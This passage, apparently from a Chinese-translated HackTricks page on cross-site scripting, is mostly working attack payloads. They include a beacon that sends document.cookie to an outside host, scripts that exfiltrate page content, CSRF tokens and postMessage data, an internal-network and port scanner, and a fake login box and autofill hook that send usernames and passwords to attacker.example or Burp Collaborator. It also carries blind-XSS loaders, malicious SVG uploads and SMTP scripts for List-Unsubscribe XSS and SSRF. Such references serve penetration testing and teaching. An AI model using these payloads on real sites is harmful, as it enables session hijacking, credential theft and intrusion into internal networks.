<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> 您将无法通过 JavaScript 访问 cookies，如果 cookie 设置了 HTTPOnly 标志。但如果您足够幸运，这里有一些[绕过该保护的方法](../hacking-with-cookies/index.html#httponly)。

### 窃取页面内容
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### 查找内部 IP 地址
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Short times indicate a responding port_ _Longer times indicate no response._

查看 Chrome 中被禁止的 ports 列表 [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) 和 Firefox 中的列表 [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### 用于请求 credentials 的框
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### 自动填充密码捕获
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
当在 password field 中输入任何数据时，username 和 password 会被发送到 attackers server；即使客户端选择了 saved password 而没有手动输入，credentials 也会被 ex-filtrated。

### Hijack form handlers to exfiltrate credentials (const shadowing)

如果关键 handler（例如 `function DoLogin(){...}`）在页面后面声明，而你的 payload 比它更早运行（例如，通过 inline JS-in-JS sink），那么先用相同名字定义一个 `const` 来 preempt 并 lock 该 handler。后续的 function 声明无法重新绑定 `const` 名称，从而使你的 hook 保持控制：
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
注意事项
- 这依赖于执行顺序：你的注入必须在合法声明之前执行。
- 如果你的 payload 被包裹在 `eval(...)` 中，`const/let` 绑定不会成为全局变量。使用动态的 `<script>` 注入技术（见章节 “Deliverable payloads with eval(atob()) and scope nuances”）以确保一个真正的全局且不可重新绑定的变量。
- 当关键字过滤阻止代码时，可结合 Unicode 转义标识符或用 `eval(atob('...'))` 传递，如上所示。

### Keylogger

在 github 上随便一搜我找到了几个不同的：

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- 你也可以使用 metasploit 的 `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### 窃取 PostMessage 消息
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### 滥用 Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### 访问 Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

你也可以使用: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - 访问隐藏内容

From [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) it's possible to learn that even if some values disappear from JS, it's still possible to find them in JS attributes in different objects. 例如，REGEX 的一个输入即使在该 regex 输入的值被移除后，仍然可以找到：
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS 滥用其他漏洞

### XSS 在 Markdown 中

能注入会被渲染的 Markdown 代码吗？也许你可以获得 XSS！查看：


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS 到 SSRF

在一个**使用缓存的网站**上发现了 XSS？尝试通过 Edge Side Include Injection 将其**升级为 SSRF**，使用以下 payload：
```python
<esi:include src="http://yoursite.com/capture" />
```
可用于绕过 cookie 限制、XSS 过滤器及更多用途！\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### 动态创建的 PDF 中的 XSS

如果一个网页使用用户可控输入创建 PDF，你可以尝试**trick the bot**（欺骗生成 PDF 的 bot）以**执行任意 JS 代码**。\
因此，如果**PDF creator bot finds**某种**HTML**标签，它会**interpret**这些标签，你可以滥用这种行为导致**Server XSS**。


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

如果你无法注入 HTML 标签，尝试**注入 PDF 数据**可能是值得的：


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS 在 Amp4Email 中

AMP 旨在加速移动设备上的网页性能，它在 HTML 标签的基础上辅以 JavaScript 来保证功能，强调速度与安全。它支持多种组件来实现不同功能，可通过 [AMP components](https://amp.dev/documentation/components/?format=websites) 访问。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) 格式将特定 AMP 组件扩展到电子邮件，使收件人能够直接在邮件中与内容交互。

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe 头滥用（Webmail XSS & SSRF）

RFC 2369 的 `List-Unsubscribe` 头允许嵌入攻击者控制的 URI，许多 webmail 和邮件客户端会自动将它们转换为 “Unsubscribe” 按钮。当这些 URI 在未校验的情况下被渲染或抓取时，该头就成为注入点，可导致存储型 XSS（如果取消订阅链接被放入 DOM）和 SSRF（如果服务器代表用户执行取消订阅请求）。

#### 通过 `javascript:` URI 的存储型 XSS

1. **给自己发送一封邮件**，其头指向一个 `javascript:` URI，同时保持邮件其余内容无害，以免被垃圾邮件过滤器丢弃。
2. **确保 UI 会渲染该值**（许多客户端在 “List Info” 窗格中显示），并检查生成的 `<a>` 标签是否继承了攻击者控制的属性，例如 `href` 或 `target`。
3. **触发执行**（例如 CTRL+click、middle-click，或选择 "open in new tab"）当链接使用 `target="_blank"` 时；浏览器会在 webmail 应用的 origin 中评估提供的 JavaScript。
4. 观察存储型 XSS 原语：payload 会随邮件持久化，只需点击即可执行。
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
URI 中的换行字节 (`%0a`) 表明即使是不常见的字符也能在易受攻击的客户端（例如 Horde IMP H5）的渲染管道中存活下来，该客户端会在锚点标签内逐字输出该字符串。

<details>
<summary>用于传递恶意 List-Unsubscribe header 的最小 SMTP PoC</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### 服务器端退订代理 -> SSRF

一些客户端，例如 Nextcloud Mail app，会在服务器端代理退订操作：点击按钮会指示服务器自身去抓取提供的 URL。这会将该 header 转变为一个 SSRF 原语，尤其是在管理员将 'allow_local_remote_servers' => true (documented in [HackerOne report 2902856](https://hackerone.com/reports/2902856)) 时，这允许对 loopback 和 RFC1918 范围的请求。

1. **制作一封电子邮件**，其 `List-Unsubscribe` 指向攻击者控制的端点（对于盲 SSRF 使用 Burp Collaborator / OAST）。
2. **保留 `List-Unsubscribe-Post: List-Unsubscribe=One-Click`**，以便 UI 显示单击退订按钮。
3. **满足信任要求**：例如 Nextcloud 只有在邮件通过 DKIM 校验时才会执行 HTTPS 退订请求，因此攻击者必须使用其控制的域对邮件进行签名。
4. **将邮件投递到目标服务器处理的邮箱**，并等待用户点击退订按钮。
5. **在 collaborator 端点观察服务器端回调**，一旦确认该原语，可转向内部地址进行探测。
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>用于 SSRF 测试的 DKIM 签名 List-Unsubscribe 消息</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**测试说明**

- 使用 OAST endpoint 收集盲 SSRF 命中，然后在确认利用原语后，将 `List-Unsubscribe` URL 调整为目标 `http://127.0.0.1:PORT`、元数据服务，或其他内部主机。
- 因为退订辅助程序通常重用与应用相同的 HTTP 堆栈，你会继承其代理设置、HTTP verbs 和头部重写，从而启用在 [SSRF methodology](../ssrf-server-side-request-forgery/README.md) 中描述的进一步遍历技巧。

### XSS 上传文件 (svg)

将类似下面的文件作为图片上传（来自 [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)）：
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
查找 **更多 SVG payloads 在** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## 其他 JS 技巧与相关信息


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS 资源

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## 参考资料

- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
